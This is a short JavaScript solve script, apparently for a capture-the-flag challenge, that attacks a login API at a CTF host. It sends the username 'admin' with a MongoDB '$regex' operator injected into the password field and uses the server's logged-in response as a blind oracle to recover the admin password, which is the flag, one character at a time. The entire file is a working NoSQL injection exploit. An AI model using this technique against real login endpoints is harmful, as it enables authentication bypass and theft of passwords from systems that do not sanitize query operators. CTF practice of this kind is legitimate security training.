const url = "https://quarkctf24.onrender.com/api/login";
let flag = "";
const allCharacters =
  "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^()@_{}";

async function solve() {
  while (true) {
    for (let i = 0; i < allCharacters.length; i++) {
      let currentChar = allCharacters[i];
      const passwordQuery = `^${flag}${currentChar}.*$`;
      const apiBody = {
        username: "admin",
        password: { "$regex": passwordQuery }
      };

      const response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-type": "application/json",
        },
        body: JSON.stringify(apiBody),
      });

      const data = await response.json();
      if (data.logged == 1) {
        flag += currentChar;
        console.log(flag);
        if (currentChar === "}") 
        {
            console.log("Flag found:", flag);
            return;
        }

      }
    }
  }
}

solve();
